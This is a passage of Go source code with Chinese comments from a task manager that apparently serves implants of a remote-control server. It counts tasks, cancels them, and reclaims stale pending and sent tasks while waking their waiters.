	}

	db := database.Get()
	if db != nil {
		db.UpdateTask(task)
	}

	// 取消 = 置为 failed（终态），等待者同样要被唤醒。
	m.notifyLocked(id)

	logging.Info("task", "Task %d cancelled", id)
	return nil
}

func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.tasks)
}

func (m *Manager) CountPending() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.pending)
}

func (m *Manager) CountCompleted() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.completed)
}

func (m *Manager) CleanupOldTasks(maxAge time.Duration) int {
	m.mu.Lock()
	defer m.mu.Unlock()

	cutoff := time.Now().Add(-maxAge)
	cleaned := 0

	// 被回收的任务要从表里消失：记下 id，最后统一唤醒它们的等待者（见函数末尾）。
	// 不通知的后果是等待者挂到超时才醒——一次僵尸任务回收会让等待者白等满整个超时。
	var reclaimed []uint64

	// 终态任务（completed/failed/timeout）：按完成时间清理
	newCompleted := make([]*types.TaskInfo, 0)
	for _, task := range m.completed {
		if task.CompletedAt != nil && task.CompletedAt.After(cutoff) {
			newCompleted = append(newCompleted, task)
		} else {
			delete(m.tasks, task.ID)
			reclaimed = append(reclaimed, task.ID)
			cleaned++
		}
	}
	m.completed = newCompleted

	// 僵尸任务回收：pending/sent 且创建超过 maxAge 的任务
	// （植入体失联后任务永远卡在中间态，此前永不回收导致内存/DB 无限增长）。
	// 时间窗与终态任务一致（默认 24h），足够覆盖慢任务执行窗口。
	keptPending := make([]*types.TaskInfo, 0)
	for _, task := range m.pending {
		if task.CreatedAt.After(cutoff) {
			keptPending = append(keptPending, task)
		} else {
			delete(m.tasks, task.ID)
			reclaimed = append(reclaimed, task.ID)
			cleaned++
		}
	}
	m.pending = keptPending

	// sent 态任务不在 pending 列表，单独按 tasks map 扫描
	for _, task := range m.tasks {
		if task == nil {
			continue
		}
		if task.Status == StatusSent && task.CreatedAt.Before(cutoff) {
			delete(m.tasks, task.ID)
			reclaimed = append(reclaimed, task.ID)
			cleaned++
		}
	}

	for _, id := range reclaimed {
		m.notifyLocked(id)
	}

	if cleaned > 0 {
		logging.Info("task", "Cleaned up %d old tasks (incl. stale pending/sent)", cleaned)
	}
	return cleaned
}
